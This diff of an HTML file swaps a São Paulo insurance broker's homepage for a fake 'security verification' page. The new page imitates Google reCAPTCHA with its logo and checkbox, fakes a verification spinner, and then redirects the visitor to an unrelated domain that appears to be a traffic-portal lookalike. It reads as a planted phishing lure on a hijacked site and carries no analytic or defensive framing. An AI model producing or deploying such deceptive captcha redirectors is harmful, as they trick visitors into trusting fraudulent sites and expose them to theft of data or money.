@@ -1,93 +1,241 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Sabbag Corretora de Seguros LTDA - Soluções em seguros personalizados para automóveis, vida, residencial e empresarial em São Paulo - SP.">
-  <meta name="keywords" content="seguros, corretora, automóvel, vida, residencial, empresarial, São Paulo">
-  <meta name="author" content="Sabbag Corretora de Seguros LTDA">
-  <meta name="robots" content="index, follow">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>Sabbag Corretora de Seguros LTDA</title>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+<html lang="pt-BR"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificação de Segurança</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family: Arial, Helvetica, sans-serif;
+  background: linear-gradient(135deg,#cbd5e1,#e2e8f0);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+}
+
+/* Container */
+.container{
+  width:100%;
+  max-width:380px;
+  text-align:center;
+  padding:15px;
+}
+
+/* Card */
+.card{
+  background:#ffffff;
+  border-radius:12px;
+  padding:25px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+  animation:fadeIn 0.6s ease;
+}
+
+.title{
+  font-size:20px;
+  color:#1e293b;
+  margin-bottom:8px;
+  font-weight:600;
+}
+
+.subtitle{
+  font-size:13px;
+  color:#475569;
+  margin-bottom:20px;
+}
+
+/* Captcha */
+.captcha-box{
+  border:1px solid #d1d5db;
+  border-radius:8px;
+  padding:15px;
+  background:#f9fafb;
+}
+
+.captcha-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+}
+
+/* Área checkbox */
+.check-area{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  padding:10px;
+  border-radius:6px;
+  cursor:pointer;
+  transition:0.2s;
+}
+
+.check-area:hover{
+  background:#e2e8f0;
+}
+
+.check-area input{
+  width:22px;
+  height:22px;
+  cursor:pointer;
+  accent-color:#2563eb;
+  outline:none;
+}
+
+.check-area input:focus{
+  outline:none;
+  box-shadow:none;
+}
+
+.check-area input:invalid{
+  box-shadow:none;
+}
+
+input[type="checkbox"]{
+  appearance:auto;
+}
+
+.check-text{
+  font-size:14px;
+  color:#1e293b;
+}
+
+/* Marca */
+.captcha-brand{
+  text-align:center;
+  font-size:10px;
+  color:#64748b;
+}
+
+.captcha-brand img{
+  width:34px;
+  display:block;
+  margin:0 auto 3px;
+}
+
+/* Loader */
+.loader{
+  width:22px;
+  height:22px;
+  border:3px solid #cbd5f5;
+  border-top:3px solid #2563eb;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  display:none;
+}
+
+@keyframes spin{
+  0%{transform:rotate(0);}
+  100%{transform:rotate(360deg);}
+}
+
+/* Rodapé */
+.footer{
+  margin-top:15px;
+  font-size:12px;
+  color:#64748b;
+}
+
+.footer span{
+  display:block;
+  margin-top:4px;
+  color:#94a3b8;
+}
+
+/* Selo segurança */
+.secure{
+  margin-top:15px;
+  font-size:12px;
+  color:#16a34a;
+  font-weight:600;
+}
+
+/* animação */
+@keyframes fadeIn{
+  from{
+    opacity:0;
+    transform:translateY(15px);
+  }
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
+}
+</style>
 </head>
-<body class="bg-white text-gray-800 font-sans">
 
-  <!-- HEADER -->
-  <header class="bg-green-800 text-white p-6">
-    <div class="max-w-6xl mx-auto flex justify-between items-center">
-      <h1 class="text-2xl font-bold">Sabbag Corretora de Seguros</h1>
-      <nav class="space-x-4" aria-label="Navegação principal">
-        <a href="#sobre" class="hover:underline">Sobre</a>
-        <a href="#servicos" class="hover:underline">Serviços</a>
-        <a href="#contato" class="hover:underline">Contato</a>
-        <a href="#localizacao" class="hover:underline">Localização</a>
-      </nav>
+<body>
+
+<div class="container">
+
+  <div class="card">
+
+    <div class="title">Verificação de Segurança</div>
+    <div class="subtitle">
+      Confirme que você é humano para continuar
     </div>
-  </header>
 
-  <!-- HERO -->
-  <section class="bg-green-50 text-center py-16 px-4">
-    <h2 class="text-4xl font-bold text-green-800 mb-4">Cuidando do seu futuro com responsabilidade</h2>
-    <p class="text-lg text-gray-700 max-w-2xl mx-auto">Especialistas em seguros sob medida para proteger você, sua família e seu patrimônio em São Paulo e região.</p>
-  </section>
+    <div class="captcha-box">
 
-  <!-- SOBRE -->
-  <section id="sobre" class="py-12 px-4 max-w-6xl mx-auto">
-    <h3 class="text-2xl font-semibold text-green-800 mb-4">Sobre Nós</h3>
-    <p class="text-gray-700 mb-4">Fundada em 2017, a Sabbag Corretora de Seguros LTDA é uma empresa especializada na intermediação de seguros, oferecendo soluções personalizadas para cada perfil de cliente. Atuamos com seriedade, profissionalismo e foco total em proteger o que é mais importante para nossos segurados.</p>
-    <p class="text-gray-700 mb-4">Localizada em São Paulo, a Sabbag Corretora preza pela excelência no atendimento, com agilidade, transparência e parceria de longo prazo com seus clientes. Trabalhamos com as principais seguradoras do país para garantir as melhores coberturas com o melhor custo-benefício.</p>
-    <p class="text-gray-700 mb-4">Nossa missão é proporcionar segurança, tranquilidade e soluções inovadoras em seguros, promovendo a proteção de vidas, bens e sonhos. Valorizamos o relacionamento humano, a ética e o comprometimento com resultados.</p>
-    <p class="text-gray-700">Com mais de 8 anos de atuação, somos referência em confiança, credibilidade e soluções completas para seguros de vida, automóvel, residência, empresas e muito mais.</p>
-  </section>
+      <div class="captcha-row">
 
-  <!-- SERVIÇOS -->
-  <section id="servicos" class="py-12 px-4 bg-gray-100">
-    <div class="max-w-6xl mx-auto">
-      <h3 class="text-2xl font-semibold text-green-800 mb-6">Nossos Serviços</h3>
-      <ul class="grid md:grid-cols-2 gap-6 text-gray-700">
-        <li><span aria-hidden="true">✅</span> Seguro Automóvel</li>
-        <li><span aria-hidden="true">✅</span> Seguro Residencial</li>
-        <li><span aria-hidden="true">✅</span> Seguro de Vida</li>
-        <li><span aria-hidden="true">✅</span> Seguro Empresarial</li>
-      </ul>
-    </div>
-  </section>
+        <label class="check-area">
+          <input type="checkbox" id="check">
+          <div id="loader" class="loader"></div>
+          <span class="check-text" id="text">Não sou um robô</span>
+        </label>
 
-  <!-- CONTATO -->
-  <section id="contato" class="py-12 px-4 max-w-6xl mx-auto">
-    <h3 class="text-2xl font-semibold text-green-800 mb-4">Fale Conosco</h3>
-    <address class="not-italic text-gray-700">
-      <p class="mb-2">📱 <a href="https://wa.me/5511999908229" target="_blank" rel="noopener" class="text-green-700 underline">(11) 99990-8229 (WhatsApp)</a></p>
-      <p>✉️ <a href="mailto:arcoseguros@gmail.com" class="text-green-700 underline">arcoseguros@gmail.com</a></p>
-    </address>
-  </section>
+        <div class="captcha-brand">
+          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+          reCAPTCHA
+          <br>
+          <span style="font-size:9px;">Privacidade - Termos</span>
+        </div>
 
-  <!-- LOCALIZAÇÃO -->
-  <section id="localizacao" class="py-12 px-4 bg-gray-100">
-    <div class="max-w-6xl mx-auto">
-      <h3 class="text-2xl font-semibold text-green-800 mb-4">Onde Estamos</h3>
-      <p class="text-gray-700 mb-2">Avenida Rouxinol, 60 - Conj 409 Edif Arq Escr Moema</p>
-      <p class="text-gray-700 mb-2">Indianópolis, São Paulo - SP | CEP: 04516-000</p>
-      <div class="w-full h-64 mt-4 rounded-lg overflow-hidden">
-        <iframe
-          title="Mapa Sabbag Corretora"
-          width="100%"
-          height="100%"
-          style="border:0"
-          loading="lazy"
-          allowfullscreen
-          referrerpolicy="no-referrer-when-downgrade"
-          src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3656.9436941858234!2d-46.6709643255796!3d-23.569012278796557!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94ce5a19f8000001%3A0x61c5f3a3a9c7412d!2sAv.%20Rouxinol%2C%2060%20-%20Indian%C3%B3polis%2C%20S%C3%A3o%20Paulo%20-%20SP%2C%2004516-000!5e0!3m2!1spt-BR!2sbr!4v1713111111111!5m2!1spt-BR!2sbr">
-        </iframe>
       </div>
-    </div>
-  </section>
 
-  <!-- FOOTER -->
-  <footer class="bg-green-800 text-white py-4 text-center text-sm">
-    &copy; 2025 Sabbag Corretora de Seguros LTDA. Todos os direitos reservados. <br>CNPJ: 27.005.687/0001-04
-  </footer>
+    </div>
+
+    <div class="secure">
+      ✔ Ambiente seguro e protegido
+    </div>
+
+    <div class="footer">
+      Após marcar a opção, a verificação será realizada automaticamente
+      <span>Isso ajuda a proteger o sistema contra acessos indevidos</span>
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+const check = document.getElementById("check");
+const loader = document.getElementById("loader");
+const text = document.getElementById("text");
+
+check.addEventListener("change", () => {
+
+  if(check.checked){
+    loader.style.display = "inline-block";
+    text.innerText = "Verificando...";
+
+    setTimeout(() => {
+      loader.style.display = "none";
+      text.innerText = "Verificado ✔";
+
+      window.location.href = "https://portaltransito-sc.com/";
+
+    }, 1000);
+  }
+
+});
+</script>
+
 
 </body>
 </html>
